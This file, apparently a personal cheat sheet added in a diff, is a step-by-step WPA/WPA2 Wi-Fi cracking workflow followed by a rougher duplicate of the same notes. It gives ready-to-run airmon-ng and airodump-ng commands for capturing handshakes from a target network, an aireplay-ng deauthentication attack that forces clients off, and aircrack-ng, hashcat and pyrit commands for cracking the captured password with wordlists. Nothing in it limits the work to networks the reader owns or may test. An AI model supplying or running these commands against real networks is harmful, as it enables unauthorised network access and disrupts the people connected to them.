@@ -1,0 +1,221 @@
+================================================================================
+                     WI-FI CRACKING - FULL WORKFLOW REFERENCE
+================================================================================
+
+OVERVIEW
+--------
+This workflow captures a WPA/WPA2 handshake from a target network and cracks
+the password offline using a wordlist. A handshake is captured when a device
+connects or reconnects to the target network.
+
+Required tools: airmon-ng, airodump-ng, aireplay-ng, aircrack-ng, hashcat
+
+================================================================================
+                         STEP 1 — ENABLE MONITOR MODE
+================================================================================
+
+  sudo airmon-ng start wlan0
+
+  NOTE: This creates a new interface called wlan0mon.
+        Kill interfering processes first if prompted:
+        sudo airmon-ng check kill
+
+  Verify monitor mode is active:
+  iwconfig
+
+================================================================================
+                       STEP 2 — SCAN FOR NETWORKS
+================================================================================
+
+  airodump-ng wlan0mon
+
+  This will display all nearby networks. Note the following for your target:
+    - BSSID   (MAC address of the access point)
+    - CH      (channel the network is on)
+    - ESSID   (network name)
+
+  Press CTRL+C once you have identified your target.
+
+================================================================================
+                     STEP 3 — LOCK TO TARGET CHANNEL (OPTIONAL)
+================================================================================
+
+  sudo iwconfig wlan0mon channel <number>
+
+  Example — lock to channel 8:
+  sudo iwconfig wlan0mon channel 8
+
+  NOTE: This ensures airodump-ng stays focused on the right channel
+        and doesn't hop around missing packets.
+
+================================================================================
+                   STEP 4 — CAPTURE HANDSHAKE (TARGET NETWORK)
+================================================================================
+
+  Start focused capture on the target — saves to file:
+  sudo airodump-ng -c <channel> -w <output-filename> --bssid <BSSID> wlan0mon
+
+  Example:
+  sudo airodump-ng -c 2 -w Capture-Pat --bssid AA:BB:CC:DD:EE:FF wlan0mon
+
+  NOTE: Replace -c value with the target channel, and --bssid with the
+        target MAC address. The output file will be saved as:
+        Capture-Pat-01.cap (airodump adds the number and extension automatically)
+
+  !! NOW WAIT FOR A DEVICE TO CONNECT TO THE NETWORK !!
+     A handshake is captured when a client connects or reconnects.
+     You can force a reconnection using a deauth attack (Step 5).
+     Watch the top-right of airodump-ng for: [ WPA handshake: XX:XX:XX:XX ]
+
+================================================================================
+                  STEP 5 — DEAUTH ATTACK (FORCE RECONNECTION)
+================================================================================
+
+  Run this in a SEPARATE terminal while airodump-ng is still capturing:
+  sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon
+
+  Example:
+  sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
+
+  NOTE: This sends 5 deauthentication packets to kick clients off the network.
+        They will automatically reconnect, triggering the handshake capture.
+        Increase the number (e.g. --deauth 10) if clients don't reconnect.
+        Do NOT run this continuously — a few packets is enough.
+
+================================================================================
+                      STEP 6 — CRACK THE HANDSHAKE
+================================================================================
+
+AIRCRACK-NG (CPU-based)
+-----------------------
+
+  aircrack-ng -w /usr/share/wordlists/rockyou.txt Capture-Pat-01.cap
+
+  OR with a custom wordlist:
+  aircrack-ng Capture-Pat-01.cap -w Password.txt
+
+  Notes:
+    - Can be stopped and resumed if interrupted
+    - Supports chaining multiple wordlists
+    - Best for quick attempts or lower-powered machines
+
+  Manual crack if needed:
+  sudo aircrack-ng -w wordlist.txt capture.cap
+
+--------------------------------------------------------------------------------
+
+HASHCAT (GPU-accelerated — much faster)
+----------------------------------------
+
+  First convert .cap to .hccapx format (required by hashcat):
+  cap2hccapx Capture-Pat-01.cap capture.hccapx
+
+  Then crack:
+  hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt
+
+  Flags:
+    -m 2500    WPA/WPA2 hash mode
+    -a 0       Dictionary attack (default)
+
+  NOTE: GPU cracking is significantly faster than CPU.
+        Use -m 22000 if using newer versions of hashcat (hc22000 format).
+
+--------------------------------------------------------------------------------
+
+PYRIT (Distributed/multi-core cracking)
+-----------------------------------------
+
+  pyrit -r capture.cap -i wordlist.txt attack_db
+
+  NOTE: Useful for distributed cracking across multiple machines or cores.
+
+================================================================================
+                     TRANSFERRING FILES TO ANOTHER MACHINE
+================================================================================
+
+If you need to move your .cap file to another machine for cracking (e.g. a
+machine with a better GPU), use SCP over SSH.
+
+ON THE RECEIVING MACHINE — Install and start SSH:
+  sudo apt install openssh-server
+  sudo service ssh start
+  sudo service ssh status            (confirm it's running)
+
+ON THE SENDING MACHINE (e.g. Mac terminal):
+  scp /path/to/file username@<receiver_ip>:/destination/path
+
+  Example — send capture file from Mac to Linux machine:
+  scp ~/Desktop/Capture-Pat-01.cap kali@192.168.1.11:/home/kali/captures/
+
+  NOTE: Make sure the destination directory exists on the receiving machine.
+        You can also reverse this to pull files FROM a remote machine:
+        scp username@<remote_ip>:/path/to/file /local/destination/
+
+================================================================================
+                              QUICK REFERENCE
+================================================================================
+
+  Step 1   sudo airmon-ng start wlan0                         Enable monitor mode
+  Step 2   airodump-ng wlan0mon                               Scan for networks
+  Step 3   sudo iwconfig wlan0mon channel <ch>                Lock to channel
+  Step 4   sudo airodump-ng -c <ch> -w <file> --bssid <MAC> wlan0mon   Capture
+  Step 5   sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon   Force reconnect
+  Step 6   aircrack-ng -w <wordlist> <capfile>                Crack handshake
+
+================================================================================
+
+
+
+
+
+
+
+
+
+
+
+
+
+sudo airmon-ng start wlan0
+
+airodump-ng wlan0mon
+
+sudo iwconfig wlan0mon channel x  (change channel base on target, ch8 then replace x with 8)
+
+sudo airodump-ng -c 2 -w Capture-Pat -d (bssid) wlan0mon   OR   sudo aireplay-ng --deauth 5 -a bssid wlan0mon
+
+NOW WAIT FOR A DEVICE TO CONNECT TO THE NETWORK
+
+aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-Pat-01.cap  OR aircrack-ng Capture-Pat01cap -w Password.txt
+
+
+
+HASHCAT CRACK
+# Using hashcat for GPU acceleration
+hashcat -m 2500 capture.hccapx wordlist.txt
+
+# Using pyrit for distributed cracking
+pyrit -r capture.cap -i wordlist.txt attack_db
+
+
+
+# Uses aircrack-ng with specified wordlist
+# Can be resumed if interrupted
+# Supports multiple wordlists
+# Manual handshake cracking (if needed)
+sudo aircrack-ng -w wordlist.txt capture.cap
+
+TO SEND FILE OVER HERE FIRST:
+
+sudo apt install openssh-server (install ssh)
+
+sudo service ssh start (start ssh)
+
+sudo service ssh status (to check)
+
+ON MAC NOW:
+
+scp /path/to/file username@receiver_ip:/destination/path
+
+
+
